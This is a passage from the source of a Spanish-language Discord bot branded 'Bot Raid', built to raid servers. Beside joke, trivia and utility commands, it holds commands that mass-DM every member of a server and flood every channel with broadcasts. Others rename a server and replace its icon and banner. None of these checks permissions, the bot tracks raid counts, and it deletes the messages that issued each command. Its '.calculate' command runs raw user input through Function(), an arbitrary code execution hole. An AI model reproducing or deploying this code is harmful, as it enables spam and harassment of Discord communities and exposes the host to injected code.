      const url = args[0];
      if (!url) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar una URL')] });
      await guild.setBanner(url);
      database.addCommand('setbanner', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success('✅ Banner actualizado')] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando setbanner', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error actualizando banner')] }).catch(() => {});
    }
  },

  async setnick(message, guild, client, args) {
    try {
      const nick = args.join(' ');
      if (!nick) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un apodo')] });
      await message.member.setNickname(nick.substring(0, 32));
      database.addCommand('setnick', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Tu apodo es ahora: ${nick}`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando setnick', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error estableciendo apodo')] }).catch(() => {});
    }
  },

  async seticon(message, guild, client, args) {
    try {
      const icon = message.attachments.first();
      if (!icon) return message.reply({ embeds: [EMBEDS.error('Debes adjuntar una imagen')] });
      await guild.setIcon(icon.url);
      database.addCommand('seticon', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success('✅ Ícono actualizado')] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando seticon', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error actualizando ícono')] }).catch(() => {});
    }
  },

  async customize(message, guild, client, args) {
    try {
      const embed = new EmbedBuilder()
        .setColor(BotUtils.getRandomColor())
        .setTitle('🎨 Personalización del Servidor')
        .addFields(
          { name: '.rename <nombre>', value: 'Cambia el nombre del servidor', inline: false },
          { name: '.setbanner <url>', value: 'Establece el banner', inline: false },
          { name: '.seticon <imagen>', value: 'Establece el icono', inline: false },
          { name: '.setnick <apodo>', value: 'Cambia tu apodo', inline: false }
        )
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      message.reply({ embeds: [embed] }).catch(() => {});
      database.addCommand('customize', message.author.id, guild.id);
    } catch (err) {
      logger.error('Error en comando customize', { error: err.message });
    }
  },

  // COMANDOS DE INFORMACIÓN
  async stats(message, client, args) {
    try {
      const uptime = COMMANDS.formatUptime(client.uptime);
      const memory = BotUtils.formatBytes(process.memoryUsage().heapUsed);
      
      const embed = EMBEDS.stats({
        cacheSize: cache.size(),
        dbCommands: database.data.commands.length,
        uptime,
        memory,
        raidCount: database.data.raidStats.length,
        guilds: client.guilds.cache.size,
        users: client.users.cache.size
      });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando stats', { error: err.message });
    }
  },

  async info(message, client, args) {
    try {
      const embed = EMBEDS.info(client);
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando info', { error: err.message });
    }
  },

  async profile(message, client, args) {
    try {
      const userStats = database.getUserStats(message.author.id);
      const embed = new EmbedBuilder()
        .setColor(BotUtils.getRandomColor())
        .setTitle(`👤 Perfil - ${message.author.tag}`)
        .addFields(
          { name: 'ID', value: message.author.id, inline: true },
          { name: 'Comandos ejecutados', value: `${userStats.commands || 0}`, inline: true },
          { name: 'Raids', value: `${userStats.raids || 0}`, inline: true },
          { name: 'Nivel', value: `${userStats.level || 1}`, inline: true },
          { name: 'Reputación', value: `${userStats.reputation || 0}⭐`, inline: true },
          { name: 'Advertencias', value: `${database.getWarns(message.author.id).length}`, inline: true }
        )
        .setThumbnail(message.author.displayAvatarURL())
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando profile', { error: err.message });
    }
  },

  async guildinfo(message, guild, client, args) {
    try {
      const owner = await guild.fetchOwner();
      const embed = new EmbedBuilder()
        .setColor(0x0099FF)
        .setTitle(`ℹ️ Información - ${guild.name}`)
        .addFields(
          { name: 'ID', value: guild.id, inline: true },
          { name: 'Dueño', value: owner.user.tag, inline: true },
          { name: 'Miembros', value: `${guild.memberCount}`, inline: true },
          { name: 'Canales', value: `${guild.channels.cache.size}`, inline: true },
          { name: 'Roles', value: `${guild.roles.cache.size}`, inline: true },
          { name: 'Creado', value: new Date(guild.createdTimestamp).toLocaleString('es-ES'), inline: true }
        )
        .setThumbnail(guild.iconURL())
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando guildinfo', { error: err.message });
    }
  },

  async botinfo(message, client, args) {
    try {
      const embed = new EmbedBuilder()
        .setColor(0xFF00FF)
        .setTitle('🤖 Información del Bot')
        .addFields(
          { name: 'Versión', value: CONFIG.VERSION, inline: true },
          { name: 'Uptime', value: COMMANDS.formatUptime(client.uptime), inline: true },
          { name: 'Servidores', value: `${client.guilds.cache.size}`, inline: true },
          { name: 'Comandos', value: `${Object.keys(COMMANDS).length}`, inline: true },
          { name: 'Creador', value: 'Triangulito The Goat', inline: true },
          { name: 'Memoria', value: BotUtils.formatBytes(process.memoryUsage().heapUsed), inline: true }
        )
        .setThumbnail(client.user.displayAvatarURL())
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando botinfo', { error: err.message });
    }
  },

  async serverdata(message, guild, client, args) {
    try {
      const stats = database.getGuildStats(guild.id);
      const embed = new EmbedBuilder()
        .setColor(0x00FF00)
        .setTitle(`📊 Datos del Servidor`)
        .addFields(
          { name: 'Raids totales', value: `${stats.raidCount || 0}`, inline: true },
          { name: 'Último raid', value: stats.lastRaid ? new Date(stats.lastRaid).toLocaleString('es-ES') : 'Nunca', inline: true },
          { name: 'Se unió', value: new Date(stats.created).toLocaleString('es-ES'), inline: true }
        )
        .setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando serverdata', { error: err.message });
    }
  },

  // COMANDOS DE ENTRETENIMIENTO
  async meme(message, client, args) {
    try {
      const memes = [
        'Un desarrollador entra al bar... No, es error de compilación. 😂',
        'Tengo tres monitores porque necesito ver mis errores en alta definición. 📺',
        '¿Por qué los programadores prefieren el dark mode? Porque la luz atrae bugs! 🐛',
        'Me gusta mi café como me gusta mi código: sin azúcar y crudo. ☕',
        'El mejor comentario del código: // No sé por qué funciona, pero FUNCIONA. 🤷'
      ];
      
      const randomMeme = memes[Math.floor(Math.random() * memes.length)];
      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('😂 MEME PARA TI').setDescription(randomMeme).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando meme', { error: err.message });
    }
  },

  async joke(message, client, args) {
    try {
      const jokes = [
        '¿Cuál es el colmo de un programador? No tener arreglo. 😆',
        '¿Por qué JavaScript es tan malo en relaciones? Porque siempre termina con `;` 💔',
        'Un byte entra al bar. El camarero pregunta: ¿Qué quieres? El byte responde: Whiskey, que es lo único que toma. 🥃',
        '¿Qué hace un programador cuando tiene depresión? Actualiza su LinkedIn. 💼',
        'La diferencia entre un novato y un experto es que el experto cometió más errores. 🎓'
      ];
      
      const randomJoke = jokes[Math.floor(Math.random() * jokes.length)];
      const embed = new EmbedBuilder().setColor(0xFFFF00).setTitle('🤣 CHISTE PARA TI').setDescription(randomJoke).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando joke', { error: err.message });
    }
  },

  async fact(message, client, args) {
    try {
      const facts = [
        'Los programadores gastan más tiempo depurando código que escribiéndolo. 🐛',
        'El 80% del tiempo de desarrollo es entender el código de alguien más. 😵',
        'Stack Overflow es el sitio web más visitado por desarrolladores del mundo. 🌍',
        'El primer error en la historia de la programación fue un insecto de verdad. 🐛',
        'Git fue creado por Linus Torvalds en 2005 en solo 4 días. ⚡'
      ];
      
      const randomFact = facts[Math.floor(Math.random() * facts.length)];
      const embed = new EmbedBuilder().setColor(0x00FFFF).setTitle('💡 DATO INTERESANTE').setDescription(randomFact).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando fact', { error: err.message });
    }
  },

  async trivia(message, client, args) {
    try {
      const trivias = [
        { question: '¿Cuál fue el primer lenguaje de programación?', answer: 'Plankalkül (1945)' },
        { question: '¿En qué año se creó Python?', answer: '1991' },
        { question: '¿Quién es el creador de Python?', answer: 'Guido van Rossum' },
        { question: '¿Cuántos bits tiene un byte?', answer: '8 bits' },
        { question: '¿Qué significa HTML?', answer: 'HyperText Markup Language' }
      ];
      
      const randomTrivia = trivias[Math.floor(Math.random() * trivias.length)];
      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🧠 TRIVIA TECH').addFields({ name: 'Pregunta:', value: randomTrivia.question, inline: false }, { name: 'Respuesta:', value: `||${randomTrivia.answer}||`, inline: false }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando trivia', { error: err.message });
    }
  },

  async quote(message, client, args) {
    try {
      const quotes = [
        '"La mejor forma de predecir el futuro es inventarlo." - Alan Kay',
        '"La simplicidad es la máxima sofisticación." - Leonardo da Vinci',
        '"El código es poesía." - Desconocido',
        '"Primero lo haces funcionar, luego lo haces bien." - Kent Beck',
        '"La única forma de aprender un lenguaje de programación es escribiendo programas en él." - Dennis Ritchie'
      ];
      
      const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
      const embed = new EmbedBuilder().setColor(0xFFFFFF).setTitle('💭 CITA INSPIRADORA').setDescription(randomQuote).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando quote', { error: err.message });
    }
  },

  async poem(message, client, args) {
    try {
      const poems = [
        'En el mundo del código,\nDonde todo es lógica y función,\nLos bugs nos persiguen,\nComo una obsesión. 📝',
        'Líneas de código sin fin,\nAlgoritmos que no se detienen,\nEn la mente del programador,\nLa música que siempre suena. 🎵',
        'Errores en la consola,\nDebugger corriendo sin parar,\nLa vida de un dev es ésta,\nHasta lograr compilar. 💻'
      ];
      
      const randomPoem = poems[Math.floor(Math.random() * poems.length)];
      const embed = new EmbedBuilder().setColor(0xFF69B4).setTitle('📜 POEMA').setDescription(randomPoem).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando poem', { error: err.message });
    }
  },

  async ascii(message, client, args) {
    try {
      const text = args.join(' ') || 'BOT RAID';
      const asciiArt = `
\`\`\`
 ____   __  _____  ___   _  ______  ___  ____  
| __ ) / / |_   _| / _ | | |/ / __ |/ _ \\|  _ \\
| _ \\|  \\  | | |  / /_\\ | / /|  __// /_\\ | | | |
| |_) | |  | | | / _____ \\/ / | |_ / _____ | |_| |
|____/|__| |_| |/_/ __\\_|_/  \\___/_/   \\_|____/
\`\`\``;
      
      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🎨 ASCII ART').setDescription(asciiArt).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando ascii', { error: err.message });
    }
  },

  // COMANDOS DE UTILIDADES
  async ping(message, client, args) {
    try {
      const msg = await message.reply({ content: '🏓 Calculando ping...' });
      const latency = msg.createdTimestamp - message.createdTimestamp;
      const wsLatency = Math.round(client.ws.ping);

      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🏓 Pong!').addFields({ name: 'Latencia del Mensaje', value: `${latency}ms`, inline: true }, { name: 'Latencia WebSocket', value: `${wsLatency}ms`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      msg.edit({ content: '', embeds: [embed] });
    } catch (err) {
      logger.error('Error en comando ping', { error: err.message });
    }
  },

  async uptime(message, client, args) {
    try {
      const uptime = COMMANDS.formatUptime(client.uptime);
      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('⏱️ Uptime del Bot').setDescription(`El bot lleva activo: **${uptime}**`).addFields({ name: 'Milisegundos', value: `${client.uptime}ms`, inline: true }, { name: 'Hora del Servidor', value: new Date().toLocaleString('es-ES'), inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando uptime', { error: err.message });
    }
  },

  async version(message, client, args) {
    try {
      const embed = new EmbedBuilder().setColor(0x0099FF).setTitle('📦 Información de Versión').addFields({ name: 'Versión del Bot', value: CONFIG.VERSION, inline: true }, { name: 'Node.js', value: process.version, inline: true }, { name: 'Discord.js', value: require('discord.js').version, inline: true }, { name: 'Uptime', value: COMMANDS.formatUptime(client.uptime), inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando version', { error: err.message });
    }
  },

  async clear(message, guild, client, args) {
    try {
      cache.clear();
      message.reply({ embeds: [EMBEDS.success('✅ Cache limpiado correctamente')] }).catch(() => {});
      logger.success('Cache limpiado por comando');
    } catch (err) {
      logger.error('Error en comando clear', { error: err.message });
    }
  },

  async ayuda(message, client, args) {
    try {
      message.reply({ embeds: [EMBEDS.help()] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando ayuda', { error: err.message });
    }
  },

  async commands(message, client, args) {
    try {
      const commandsList = Object.keys(COMMANDS).sort();
      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('📋 Lista de Comandos').setDescription(`Total de comandos: **${commandsList.length}**`).addFields({ name: 'Comandos', value: commandsList.map(cmd => `\`${cmd}\``).join(' • '), inline: false }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando commands', { error: err.message });
    }
  },

  // COMANDOS DE COMUNICACIÓN
  async md(message, guild, client, args) {
    try {
      const text = args.join(' ');
      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
      await BotUtils.dmAllMembers(guild, text);
      database.addCommand('md', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success('✅ DMs enviados')] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando md', { error: err.message });
      message.reply({ embeds: [EMBEDS.error('Error enviando mensajes')] }).catch(() => {});
    }
  },

  async broadcast(message, guild, client, args) {
    try {
      const text = args.join(' ');
      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });

      const channels = await guild.channels.fetch();
      const textChannels = [...channels.values()].filter(c => c.isTextBased());

      let sent = 0;
      for (const channel of textChannels) {
        try {
          await channel.send({ content: text });
          sent++;
        } catch (err) {
          logger.debug('Error enviando broadcast');
        }
      }

      database.addCommand('broadcast', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Broadcast enviado a ${sent} canales`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando broadcast', { error: err.message });
    }
  },

  async announce(message, guild, client, args) {
    try {
      const announcement = args.join(' ');
      if (!announcement) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un anuncio')] });

      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('📣 ANUNCIO IMPORTANTE').setDescription(announcement).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });

      const channels = await guild.channels.fetch();
      const textChannels = [...channels.values()].filter(c => c.isTextBased());

      let sent = 0;
      for (const channel of textChannels) {
        try {
          await channel.send({ embeds: [embed] });
          sent++;
        } catch (err) {
          logger.debug('Error enviando anuncio');
        }
      }

      database.addCommand('announce', message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`✅ Anuncio enviado a ${sent} canales`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando announce', { error: err.message });
    }
  },

  async say(message, guild, client, args) {
    try {
      const text = args.join(' ');
      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
      await message.channel.send({ content: text });
      database.addCommand('say', message.author.id, guild?.id || 'DM');
    } catch (err) {
      logger.error('Error en comando say', { error: err.message });
    }
  },

  async echo(message, guild, client, args) {
    try {
      const text = args.join(' ');
      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
      
      const embed = new EmbedBuilder().setColor(BotUtils.getRandomColor()).setTitle('🔊 ECO').setDescription(text).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      await message.channel.send({ embeds: [embed] });
      database.addCommand('echo', message.author.id, guild?.id || 'DM');
    } catch (err) {
      logger.error('Error en comando echo', { error: err.message });
    }
  },

  // COMANDOS DE HERRAMIENTAS
  async calculate(message, client, args) {
    try {
      const expression = args.join(' ');
      if (!expression) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar una expresión')] });
      
      try {
        const result = Function('"use strict"; return (' + expression + ')')();
        const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🧮 CALCULADORA').addFields({ name: 'Expresión', value: expression, inline: true }, { name: 'Resultado', value: `${result}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
        message.reply({ embeds: [embed] }).catch(() => {});
      } catch (e) {
        message.reply({ embeds: [EMBEDS.error('Expresión inválida')] });
      }
    } catch (err) {
      logger.error('Error en comando calculate', { error: err.message });
    }
  },

  async random(message, client, args) {
    try {
      const max = parseInt(args[0]) || 100;
      const min = parseInt(args[1]) || 0;
      const random = Math.floor(Math.random() * (max - min + 1)) + min;
      
      const embed = new EmbedBuilder().setColor(0x00FFFF).setTitle('🎲 NÚMERO ALEATORIO').addFields({ name: 'Rango', value: `${min} - ${max}`, inline: true }, { name: 'Resultado', value: `${random}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando random', { error: err.message });
    }
  },

  async dice(message, client, args) {
    try {
      const roll = Math.floor(Math.random() * 6) + 1;
      const embed = new EmbedBuilder().setColor(0xFF6347).setTitle('🎲 LANZAR DADO').setDescription(`🎲 Resultado: **${roll}**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando dice', { error: err.message });
    }
  },

  async card(message, client, args) {
    try {
      const suits = ['♠️', '♥️', '♦️', '♣️'];
      const values = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
      const suit = suits[Math.floor(Math.random() * suits.length)];
      const value = values[Math.floor(Math.random() * values.length)];
      
      const embed = new EmbedBuilder().setColor(0xFFD700).setTitle('🃏 CARTA ALEATORIA').setDescription(`${value} ${suit}`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando card', { error: err.message });
    }
  },

  // COMANDOS DE USUARIOS
  async warn(message, client, args) {
    try {
      const user = message.mentions.users.first();
      const reason = args.slice(1).join(' ') || 'Sin especificar';
      
      if (!user) return message.reply({ embeds: [EMBEDS.error('Debes mencionar un usuario')] });
      
      database.addWarn(user.id, reason);
      const warns = database.getWarns(user.id);
      
      const embed = new EmbedBuilder().setColor(0xFF0000).setTitle('⚠️ ADVERTENCIA').addFields({ name: 'Usuario', value: user.tag, inline: true }, { name: 'Razón', value: reason, inline: true }, { name: 'Total de advertencias', value: `${warns.length}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando warn', { error: err.message });
    }
  },

  async warns(message, client, args) {
    try {
      const user = message.mentions.users.first() || message.author;
      const warns = database.getWarns(user.id);
      
      const warnsText = warns.length > 0 ? warns.map((w, i) => `${i + 1}. ${w.reason} - ${new Date(w.timestamp).toLocaleString('es-ES')}`).join('\n') : 'Sin advertencias';
      
      const embed = new EmbedBuilder().setColor(0xFFFF00).setTitle(`⚠️ Advertencias de ${user.tag}`).setDescription(warnsText).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando warns', { error: err.message });
    }
  },

  async reputation(message, client, args) {
    try {
      const user = message.mentions.users.first() || message.author;
      const stats = database.getUserStats(user.id);
      
      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle(`⭐ Reputación de ${user.tag}`).setDescription(`**${stats.reputation || 0}⭐**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando reputation', { error: err.message });
    }
  },

  async level(message, client, args) {
    try {
      const stats = database.getUserStats(message.author.id);
      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle(`📊 Nivel de ${message.author.tag}`).setDescription(`**Nivel: ${stats.level}**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando level', { error: err.message });
    }
  },

  async rank(message, client, args) {
    try {
      const users = Object.entries(database.data.users).sort((a, b) => (b[1].reputation || 0) - (a[1].reputation || 0)).slice(0, 10);
      
      const rankText = users.map((u, i) => `${i + 1}. <@${u[0]}> - ${u[1].reputation || 0}⭐`).join('\n');
      
      const embed = new EmbedBuilder().setColor(0xFFD700).setTitle('🏆 TOP 10 RANKING').setDescription(rankText || 'Sin datos').setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
      message.reply({ embeds: [embed] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando rank', { error: err.message });
    }
  },

  // COMANDOS DE GESTIÓN
  async favorite(message, guild, client, args) {
    try {
      if (!guild) return message.reply({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] });
      database.addFavorite(message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`⭐ ${guild.name} marcado como favorito`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando favorite', { error: err.message });
    }
  },

  async unfavorite(message, guild, client, args) {
    try {
      if (!guild) return message.reply({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] });
      database.removeFavorite(message.author.id, guild.id);
      message.reply({ embeds: [EMBEDS.success(`❌ ${guild.name} eliminado de favoritos`)] }).catch(() => {});
    } catch (err) {
      logger.error('Error en comando unfavorite', { error: err.message });
    }
  },

  formatUptime(uptime) {
    if (!uptime) return 'N/A';
    const days = Math.floor(uptime / 86400000);
    const hours = Math.floor((uptime % 86400000) / 3600000);
    const minutes = Math.floor((uptime % 3600000) / 60000);
    const seconds = Math.floor((uptime % 60000) / 1000);
    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
  }
};

// ==================== CARGAR BUFFERS ====================

const BUFFERS = {
  icon: BotUtils.loadBuffer(CONFIG.ICON_FILE),
  triangulito: BotUtils.loadBuffer(CONFIG.TRIANGULITO_FILE)
};

logger.info('Buffers cargados', { 
  icon: BUFFERS.icon ? 'Cargado' : 'No encontrado',
  triangulito: BUFFERS.triangulito ? 'Cargado' : 'No encontrado'
});

// ==================== CLIENTE DISCORD ====================

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: ['MESSAGE', 'CHANNEL', 'REACTION']
});

// ==================== EVENTOS ====================

client.on('ready', () => {
  logger.success(`Bot conectado como: ${client.user.tag}`);
  const perms = 1342385206n;
  logger.info(`Link de invitación: https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=${perms}&scope=bot`);
  
  client.user.setStatus('online');
  client.user.setActivity('Bot Raid v' + CONFIG.VERSION, { type: 'Watching' });
  
  logger.info('Estadísticas del bot', {
    servidores: client.guilds.cache.size,
    usuarios: client.users.cache.size,
    canales: client.channels.cache.size
  });
});

client.on('messageCreate', async message => {
  try {
    if (!message.content.startsWith(CONFIG.PREFIX) || message.author.bot) return;

    const rateLimitCheck = rateLimiter.check(message.author.id);
    if (!rateLimitCheck.allowed) {
      logger.warn('Rate limit excedido', { userId: message.author.id });
      return message.reply({ embeds: [EMBEDS.warning(`⏱️ Debes esperar ${Math.ceil(rateLimitCheck.resetIn / 1000)}s`)] }).catch(() => {});
    }

    message.delete().catch(() => {});

    const { guild, member } = message;
    const parts = message.content.slice(1).split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    const globalCommands = ['meme', 'joke', 'fact', 'trivia', 'quote', 'poem', 'ascii', 'profile', 'botinfo', 'ayuda', 'commands', 'version', 'info', 'ping', 'uptime', 'stats', 'calculate', 'random', 'dice', 'card', 'warns', 'reputation', 'level', 'rank'];

    if (!guild && !globalCommands.includes(cmd)) {
      return message.channel.send({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] }).catch(() => {});
    }

    if (COMMANDS[cmd]) {
      logger.info(`Ejecutando comando: .${cmd}`, { userId: message.author.id, guildId: guild?.id });
      
      try {
        await COMMANDS[cmd](message, guild, client, args, member);
      } catch (err) {
        logger.error(`Error ejecutando comando ${cmd}`, { error: err.message });
        message.reply({ embeds: [EMBEDS.error(`Error ejecutando comando: ${err.message}`)] }).catch(() => {});
      }
    }
  } catch (err) {
    logger.error('Error procesando comando', { error: err.message });
  }
});

client.on('guildCreate', guild => {
  logger.info('Bot añadido a nuevo servidor', { guildId: guild.id, guildName: guild.name });
  database.updateGuildStats(guild.id, { joinedAt: new Date().toISOString() });
});

client.on('guildDelete', guild => {
  logger.info('Bot removido de servidor', { guildId: guild.id, guildName: guild.name });
});

client.on('error', err => {
  logger.error('Error del cliente Discord', { error: err.message });
});

client.on('warn', info => {
  logger.warn('Advertencia del cliente Discord', { warning: info });
});

// ==================== GESTIÓN DE PROCESOS ====================

process.on('unhandledRejection', err => {
  logger.error('Promise rechazada sin manejar', { error: err.message, stack: err.stack });
});

process.on('uncaughtException', err => {
  logger.error('Excepción no capturada', { error: err.message, stack: err.stack });
  process.exit(1);
});

// ==================== LOGIN ====================

if (!CONFIG.DISCORD_TOKEN) {
  logger.error('DISCORD_TOKEN no está configurado en .env');
  process.exit(1);
}

logger.info('Iniciando bot...', { version: CONFIG.VERSION, debug: CONFIG.DEBUG_MODE });

client.login(CONFIG.DISCORD_TOKEN).catch(err => {
  logger.error('Error al conectar a Discord', { error: err.message });
  process.exit(1);
});

// ==================== EXPORTAR ====================

module.exports = { client, logger, database, cache, BotUtils };
